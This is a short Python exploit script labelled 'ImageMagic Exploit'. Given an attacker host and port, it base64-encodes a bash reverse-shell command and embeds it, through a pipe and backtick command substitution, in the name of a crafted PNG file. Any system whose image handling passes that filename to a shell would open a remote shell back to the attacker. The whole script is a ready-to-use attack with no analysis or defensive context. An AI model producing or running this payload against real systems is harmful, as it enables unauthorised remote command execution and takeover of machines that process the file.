#!/usr/bin/env python3 

#ImageMagic Exploit

import os
import argparse
import sys
import subprocess
from subprocess import Popen

parser = argparse.ArgumentParser(description="Image Magic", formatter_class=argparse.ArgumentDefaultsHelpFormatter)
parser.add_argument("-l", "--LHOST", action="store", help="LHOST")
parser.add_argument("-p", "--LPORT", action="store", help="LPORT")
args = parser.parse_args()
parser.parse_args(args=None if sys.argv[1:] else ['--help'])

LHOST = args.LHOST
LPORT = args.LPORT

s = Popen([f"echo -ne test > en.png"], shell=True)
s.wait()
s = Popen([f"echo 'bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1' > shell.txt | base64 shell.txt > base.txt"], shell=True)
s.wait()
with open ("base.txt", "r") as f:
    content = f.read()
    s = Popen([f"cp en.png '|en\"`echo {content} | base64 -d | bash`\".png\'"], shell=True)
    s.wait()

